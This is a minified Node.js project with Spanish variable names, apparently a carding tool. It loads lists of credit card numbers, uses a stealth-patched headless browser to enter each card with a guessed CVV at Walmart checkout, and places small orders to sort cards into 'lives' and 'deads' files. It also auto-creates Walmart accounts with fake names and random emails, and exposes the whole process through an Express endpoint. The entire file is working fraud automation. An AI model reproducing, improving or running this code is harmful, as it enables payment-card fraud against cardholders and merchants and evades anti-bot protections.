var v=(i,r)=>()=>(r||i((r={exports:{}}).exports,r),r.exports);var j=v((ut,q)=>{var bi=require("fs"),yi=new Promise((i,r)=>{bi.readFile("./db/deads.txt","utf8",(d,o)=>{d&&r(d),i(o.split(`
`).filter(a=>a.length>0))})});q.exports={deads:yi}});var D=v((ht,O)=>{var gi=require("fs"),xi=new Promise((i,r)=>{gi.readFile("./db/lives.txt","utf8",(d,o)=>(d&&r(d),i(o.split(`
`).filter(a=>a.length>0))))});O.exports={lives:xi}});var X=v((pt,G)=>{var ki=require("fs"),Fi=new Promise((i,r)=>{ki.readFile("./db/tarjetas.txt","utf8",(d,o)=>{d&&r(d),o=o.split(`
`).filter(e=>e.length>0);let a=o.filter(e=>e.includes("|")),n=o.filter(e=>e.includes("|")==!1).map(e=>`${e}${a}`);i(n)})});G.exports={tarjetas:Fi}});var m=v((mt,R)=>{var{deads:Ti}=j(),{lives:_i}=D(),{tarjetas:Ci}=X();R.exports={deads:Ti,lives:_i,tarjetas:Ci}});var g=v((ft,A)=>{var{tarjetas:$i}=m(),N=[],y=[],z=[],P=[];$i.then(i=>{for(var r of i)y.includes(r)==!1&&y.push(r);for(var d of y){var o=d.split("|")[0],a=d.split("|")[1],t=parseInt(d.split("|")[2]);N.push(o),z.push(a),P.push(t)}});A.exports={cards:N,fechaMes:z,fechaA\u00F1o:P}});var x=v((yt,L)=>{var Si=require("fs"),bt=require("colors"),{deads:qi}=m(),ji=async i=>{if((await qi).filter(o=>o==i).length>0)return console.log(`${i.yellow} este ${"dead".red} ya existe en db/deads.txt`);Si.appendFile("./db/deads.txt",i+`
`,{encoding:"utf-8"},o=>{if(o)throw o;return console.log(`${i.red}`)})};L.exports={agregarDeads:ji}});var k=v((gt,H)=>{var M=require("fs"),Oi=i=>{M.readFile("./db/tarjetas.txt","utf8",(r,d)=>{let o=d.split(`
`).filter(n=>n.length>0),a=o.filter(n=>n!=i);if(o.length===a.length)return console.log("se ha colocado una tarjeta invalida");let t=a.join(`
`);M.writeFile("./db/tarjetas.txt",t,n=>{if(n)throw n})})};H.exports={barridoTarjetas:Oi}});var F=v((kt,B)=>{var Di=require("fs"),xt=require("colors"),{lives:Gi}=m(),Xi=async i=>{let r=i.split("|")[0];await Gi.then(d=>{if(console.log(d),d.filter(a=>a===i).length>0)return console.log(`${i.yellow} este live ya existe en db/live.txt`);Di.appendFile("./db/lives.txt",i+`
`,{encoding:"utf-8"},a=>{if(a)throw a;return console.log(`${r.green}`)})})};B.exports={agregarLive:Xi}});var V=v((Ft,U)=>{var I=require("puppeteer-extra"),{cards:w,fechaMes:T,fechaA\u00F1o:_}=g(),Ri=require("puppeteer-extra-plugin-stealth"),{agregarDeads:Ni}=x(),{barridoTarjetas:E}=k(),{agregarLive:zi}=F(),Pi=require("fs");I.use(Ri());var Ai=async({productoPersonalizado:i})=>{let r=Pi.readFileSync("./db/carritoUrl.txt","utf-8"),d=0;countl=0,contador=1;let o,a=await I.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),t=(await a.pages())[0];await t.setDefaultTimeout(0),await t.setDefaultNavigationTimeout(0),console.log("Iniciando scrap");for(var n=0;n<=w.length&&(await t.bringToFront(),await t.goto("https://www.walmart.com/checkout/photo#/payment"),await t.waitForTimeout(3e3),!await t.$("modal-content"));++n){await t.waitForTimeout(2e3),await t.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button")&&(await t.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button"),await t.waitForTimeout(3e3)),await t.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span")&&(await t.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await t.waitForTimeout(1e3),await t.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await t.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await t.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await t.waitForSelector("#firstName")),console.log(contador," ",w[n]);let u=await t.$("#firstName");if(await t.waitForTimeout(2e3),u&&(await t.type("#creditCard",`${w[n]}`),await t.type("#month-chooser",`${T[n]}`),await t.type("#year-chooser",`${_[n]}`),await t.type("#cvv","065"),await t.waitForTimeout(1e3),await t.click("div > form > div.edit-form-actions > div > button"),await t.waitForTimeout(2e3)),d==0&&(o=await a.newPage(),await o.setDefaultTimeout(0),await o.setDefaultNavigationTimeout(0)),await o.bringToFront(),await o.waitForTimeout(2e3),await o.goto(r),await o.waitForSelector("#cvv-field"),await o.$("#cvv-field")){await o.type("#cvv-field","123"),await t.waitForTimeout(1e3),await o.click("#mobile-sticky-footer > div > section > button"),await o.waitForTimeout(7e3);let S=await o.$("body > div:nth-child(18) > div > div.w_HB > div.w_GY.w_GZ > div > div.w_Gh > div > div > div.w_Q.w_U.mb1");var e=await o.mainFrame().url();e.search("thankyou")!=-1&&(countl++,console.log("lives del lote",countl),await zi(`${w[n]}|${T[n]}|${_[n]}`),E(`${w[n]}`),await o.goto(i||"https://www.walmart.com/ip/seort/10448549"),await o.waitForSelector(".dib > button"),await o.waitForTimeout(3e3),await o.click(".dib > button"),await o.waitForTimeout(3e3),await o.goto("https://www.walmart.com/cart"),await o.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await o.click(".flex .sticky .shadow-1 div .ph3  button"),await o.waitForTimeout(7e3)),e.search("thankyou")==-1&&(await Ni(`${w[n]}|${T[n]}|${_[n]}`),E(`${w[n]}`)),o&&(d=1),contador++}}};U.exports={foto:Ai}});var J=v((Tt,W)=>{var Z=require("puppeteer-extra"),Li=require("puppeteer-extra-plugin-stealth");Z.use(Li());var Mi=async({tipo:i})=>{let d=(await(await Z.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]})).pages())[0];await d.setDefaultTimeout(0),await d.bringToFront(),i=="manual-login"&&await d.goto("https://www.walmart.com/account/login"),i=="manual-torta"&&await d.goto("https://www.walmart.com/order-ahead/cake"),i=="manual-foto"&&await d.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#")};W.exports={manual:Mi}});var Y=v((_t,Q)=>{var Hi=async({page:i,tortaPersonalizada:r})=>{await i.bringToFront();let d=r||"https://www.walmart.com/order-ahead/cake/897929082/customize/size",o="#app-container > div > div.show-desktop.route-customize > div > div:nth-child(3) > div > button",a="div:nth-child(2) > form > div.zipcode-form-field.field.field--secondary > input",t="#store-3520",n="#store-continue-button > span",e="div > button.button.scheduler-buttons-primary.button--primary",c='input[arialabel=" Mobile number for order questions*"]',s="div.Grid-col.u-size-1.u-size-1-m > div > div > button";if(await i.goto("https://www.walmart.com/checkout/orderahead#/"),await i.$("body > div.js-content > div > div.modal-root > div.modal.modal--active-fill.responsive-modal.CXO-modal-ny > div.modal-content")){await i.goto(d),await i.waitForSelector(o),await i.click(o),await i.waitForTimeout(3e3);let p=await i.$("div:nth-child(2) > form > div.zipcode-form-field.field.field--secondary > input");return await i.waitForTimeout(1e3),p&&(await i.waitForSelector(a),await i.waitForTimeout(4e3),await i.type(a,"10259"),await i.keyboard.press("Enter"),await i.waitForSelector(t),await i.waitForTimeout(2e3),await i.click(t),await i.waitForSelector(n),await i.click(n),await i.waitForTimeout(3e3)),await i.$(e)&&(await i.waitForSelector(e),await i.click(e),await i.waitForTimeout(3e3),await i.click(o),await i.waitForTimeout(5e3)),await i.waitForTimeout(8e3),await i.$(c)&&(await i.click(c),await i.type(c,"2121234567")),await i.waitForTimeout(1e3),await i.click(s),await i.waitForTimeout(2e3),!1}return await i.waitForTimeout(5e3),await i.$(c)&&(await i.click(c),await i.type(c,"2121234567"),await i.waitForTimeout(1e3),await i.click(s),await i.waitForTimeout(2e3)),!0};Q.exports={tortaColocar:Hi}});var ai=v((Ct,ti)=>{var ii=require("puppeteer-extra"),Bi=require("puppeteer-extra-plugin-stealth"),{tortaColocar:Ei}=Y(),{agregarLive:Ii}=F(),{agregarDeads:Ui}=x(),Vi=require("fs"),{barridoTarjetas:K}=k(),{cards:l,fechaA\u00F1o:f,fechaMes:C}=g();ii.use(Bi());var Zi=async({productoPersonalizado:i,tortaPersonalizada:r,tarjeta:d})=>{let o=Vi.readFileSync("./db/carritoUrl.txt","utf-8");console.log(l);let a=0;countl=0,contador=1;let t,n=await ii.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),e=(await n.pages())[0];await e.setDefaultTimeout(0),await e.setDefaultNavigationTimeout(0),await e.goto("https://walmart.com"),console.log("iniciando scrapper...");for(var c=0;c<=l.length;++c){await Ei({page:e,tortaPersonalizada:r}),await e.waitForTimeout(2e3),await e.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button")&&(await e.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button"),await e.waitForTimeout(3e3)),await e.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span")&&(await e.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await e.waitForTimeout(1e3),await e.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await e.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await e.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await e.waitForSelector("#firstName")),console.log(contador," ",l[c]);let p=await e.$("#firstName");if(await e.waitForTimeout(2e3),p&&(await e.type("#creditCard",`${l[c]}`),await e.type("#month-chooser",`${C[c]}`),f[c]==22?await e.type("#year-chooser",`${21}`):await e.type("#year-chooser",`${f[c]}`),await e.type("#cvv","065"),await e.type("#addressLineOne","Calle buena viva"),await e.type("#addressLineTwo","apt 3 casa 219"),await e.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div > div > div > form > div.edit-form-actions > div > button"),await e.waitForTimeout(2e3)),a==0&&(t=await n.newPage(),await t.setDefaultTimeout(0),await t.setDefaultNavigationTimeout(0)),await t.bringToFront(),await t.waitForTimeout(2e3),await t.goto(o),await t.waitForTimeout(2e3),await t.$("body > div:nth-child(8) > div > div.w_Jp > div.w_H8 > div")&&(await t.click("body > div:nth-child(8) > div > div.w_Jp > div.w_H8 > div > div.w_IH > div > button"),await t.waitForSelector("div.shadow-1.br3 > div.flex.flex-column > div > div > button"),await t.click("div.shadow-1.br3 > div.flex.flex-column > div > div > button")),await t.$("body > div:nth-child(10) > div > div.w_IU > div.w_Gu")&&(await t.goto(i||"https://www.walmart.com/ip/seort/10448549"),await t.waitForSelector(".dib button"),await t.waitForTimeout(3e3),await t.click("body"),await t.click(".dib button"),await t.waitForTimeout(3e3),await t.goto("https://www.walmart.com/cart"),await t.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(7e3)),await t.waitForSelector("#cvv-field"),await t.$("#cvv-field")){await t.type("#cvv-field","123"),await t.click("#mobile-sticky-footer > div > section > button"),await t.waitForTimeout(7e3);var s=await t.mainFrame().url();s.search("thankyou")!=-1&&(countl++,console.log("lives del lote",countl),await Ii(`${l[c]}|${C[c]}|${f[c]}`),K(`${l[c]}`),await t.goto(i||"https://www.walmart.com/ip/seort/10448549"),await t.waitForSelector(".dib > button"),await t.waitForTimeout(3e3),await t.click(".dib > button"),await t.waitForTimeout(3e3),await t.goto("https://www.walmart.com/cart"),await t.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(7e3)),s.search("thankyou")==-1&&(await Ui(`${l[c]}|${C[c]}|${f[c]}`),K(`${l[c]}`)),t&&(a=1),contador++}}};ti.exports={torta:Zi}});var ei=v(($t,oi)=>{var{foto:Wi}=V(),{manual:Ji}=J(),{torta:Qi}=ai();oi.exports={foto:Wi,manual:Ji,torta:Qi}});var ri=v((St,di)=>{var Yi=(i,r)=>{(!r||r<1)&&(r=i.length);for(let d=0;d<r;++d){let o=Math.floor(Math.random()*i.length),a=Math.floor(Math.random()*i.length),t=i[o];i[o]=i[a],i[a]=t}};di.exports={disorder:Yi}});var vi=v((qt,ci)=>{var ni=require("puppeteer-extra"),Ki=require("puppeteer-extra-plugin-stealth"),{faker:$}=require("@faker-js/faker"),{disorder:it}=ri(),tt=require("fs");ni.use(Ki());var at=async({productoPersonalizado:i})=>{let r="#__next > div:nth-child(1) > div > span > header > div:nth-child(7) > a",d="https://www.walmart.com/account/?action=Create&rm=true",o=await ni.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),a=(await o.pages())[0];if(await a.setDefaultTimeout(0),await a.setDefaultNavigationTimeout(0),await a.goto("https://www.walmart.com"),console.log("iniciando scrapper..."),await a.waitForSelector(r),(await a.$eval(r,n=>n.href)).includes("https://www.walmart.com/account/login?vid=oaoh")===!0){let n=$.internet.password(10,!0,/[A-Z][0-9][a-z]/,"@Hookom119"),e=["a","b","c","d","e","f","g","h","i","1","2","6","3","z","h","1","9","0","o","p","Z","i","1","2","6","3","z","h","1","9","0","o","p","Z"];it(e),e=e.toString().replaceAll(",","")+"@gmail.com",await a.goto("https://www.walmart.com/account/signup?vid=oaoh"),await a.waitForSelector("#sign-in-form > div > div > input"),await a.type("#sign-in-form > div > div > input",e),await a.click("#sign-in-form > button"),await a.waitForSelector("#sign-up-form > div:nth-child(2) > div > input"),await a.waitForTimeout(1e3),await a.type("#sign-up-form > div:nth-child(2) > div > input",$.name.firstName()),await a.type("#sign-up-form > div:nth-child(4) > div > input",$.name.lastName()),await a.type("#sign-up-form > div:nth-child(7) > div > div > input",n),await a.click("#sign-up-form > button"),await a.waitForNavigation(),await a.waitForTimeout(1e3),await a.$("div > button > svg")&&await a.click("div > button > svg"),await a.waitForTimeout(1e3),d==="https://www.walmart.com/account/?action=Create&rm=true"&&console.log("Cuenta creada correctamente"),await a.goto(i||"https://www.walmart.com/ip/seort/10448549"),await a.waitForSelector(".dib > button"),await a.waitForTimeout(3e3),await a.click(".dib > button"),await a.waitForTimeout(3e3),await a.goto("https://www.walmart.com/cart"),await a.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await a.click(".flex .sticky .shadow-1 div .ph3  button"),await a.waitForTimeout(6e3),await a.$("div > div > section > div > div:nth-child(4) > div")&&(await a.click("div > div > section > div > div:nth-child(4) > div"),await a.waitForTimeout(1e3),await a.waitForSelector("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input"),await a.type("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input","10001"),await a.waitForSelector("div.pa0.ma0 > div:nth-child(1) > label"),await a.click("div.pa0.ma0 > div:nth-child(1) > label"),await a.waitForTimeout(1e3),await a.waitForSelector("div.w-100.pa4.bt.b--near-white > button"),await a.click("div.w-100.pa4.bt.b--near-white > button"),await a.waitForTimeout(1e3),await a.waitForSelector("div.flex.justify-center.pb6 > div > div > div > div > button"),await a.click("div.flex.justify-center.pb6 > div > div > div > div > button"),await a.waitForNavigation()),console.log("esperando ando el total"),await a.waitForSelector("#totalSummary");let h=await a.url();tt.writeFile("./db/carritoUrl.txt",h,"utf8",u=>{if(u)throw u;console.log("carrito extraido con \xE9xito")}),await o.close()}console.log("usuario ya creado"),await o.close()};ci.exports={loginAuto:at}});var si=v((jt,li)=>{var{foto:ot,torta:et,manual:dt}=ei(),{loginAuto:rt}=vi(),nt=async({tipo:i,productoPersonalizado:r,tortaPersonalizada:d})=>{i==="foto"&&await ot({productoPersonalizado:r}),i==="torta"&&await et({productoPersonalizado:r,tortaPersonalizada:d}),i==="login"&&await rt({productoPersonalizado:r}),(i==="manual-login"||i=="manual-torta"||i=="manual-foto")&&await dt({tipo:i}),(i!="torta"||i!="foto")&&console.log("ERROR".red,"selecciona un tipo valido","torta".green,"o","foto".green,"dentro de config/config.js")};li.exports={iniciarScrapper:nt}});var hi=v((Ot,ui)=>{var{Router:ct}=require("express"),{iniciarScrapper:vt}=si(),wi=ct();wi.post("/",async(i,r)=>{let{tipo:d,cards:o,carritoWalmart:a,productoPersonalizado:t,tortaPersonalizada:n}=i.body;await vt({tipo:d,cards:o,carritoWalmart:a,productoPersonalizado:t,tortaPersonalizada:n}),r.send("hola")});ui.exports=wi});var{urlencoded:lt}=require("express"),mi=require("express"),b=mi();require("dotenv").config();var pi=process.env.PORT||3e3;b.use(mi.json());b.use(lt({extended:!1}));b.use(hi());b.listen(pi,()=>{console.log(`servidor funcionando en el puerto ${pi}`)});
